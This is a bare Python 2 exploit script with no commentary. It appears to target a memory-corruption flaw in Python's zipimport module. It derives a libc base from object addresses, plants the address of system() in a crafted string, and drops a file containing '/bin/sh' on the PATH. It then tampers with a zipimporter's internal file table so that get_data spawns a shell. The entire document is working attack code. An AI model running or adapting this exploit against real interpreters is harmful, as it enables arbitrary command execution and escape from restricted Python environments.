#!/usr/bin/env python2
import os
import zipimport
import zipfile
import struct

FILE = 'payload.txt'
ZIP = 'import.zip'
DIR = 'sh'


if not os.path.exists(DIR):
    os.mkdir(DIR)

addr = id("A")
libc_base = addr - 0x6dbbe8 #7191528
system_addr = libc_base + 0x46640
print("LIBC_BASE : %x" % libc_base)

string_addr = libc_base + 0x7c3997 #8141207

#bin_sh = os.path.join(DIR, struct.pack('<Q',  libc_base + 0x7b1998).replace("\x00", ""))
#bin_sh = os.path.join(DIR, struct.pack('<Q',  libc_base + 0x17cce0).replace("\x00", ""))
bin_sh = os.path.join(DIR, struct.pack('<Q', string_addr).replace("\x00", ""))
with open(bin_sh, 'w') as f:
    f.write("/bin/sh")
os.chmod(bin_sh, 0777)

os.putenv("PATH", os.getenv("PATH") + ":" + DIR)

some_string_obj = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
some_string_obj += "QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffff"
some_string_obj += "gggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvv"
some_string_obj += "wwwwxxxxyyyyzzzz"
some_string_obj += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
some_string_obj += "QQQQRRRRSSSSTTTTUUUU"
print("%x" % id(some_string_obj))
# func addr here
some_string_obj += struct.pack('<Q', system_addr)
a = some_string_obj
addr = id(a)
addrs = []
for i in xrange(8):
    addrs.append(addr % 0x100)
    addr /= 0x100
addrs_2 = map(lambda x:chr(x), addrs)
print(addrs_2)

print("%x" % id(some_string_obj))
# generate input
with open(FILE, 'wb') as f:
    #payload = ("a"*1024).encode('ascii')
    #payload = ("a" * 1000).encode('ascii')
    payload = ("aaaa"+("".join(addrs_2)) * 128)
    f.write(payload)

zf = zipfile.PyZipFile(ZIP, mode='w')
zf.write(FILE)
zf.close()

importer = zipimport.zipimporter(ZIP)
f = list(importer._files[FILE])
f[1] = 1 # compress
f[2] = -1 # file size
importer._files[FILE] = tuple(f)
importer.get_data(FILE)
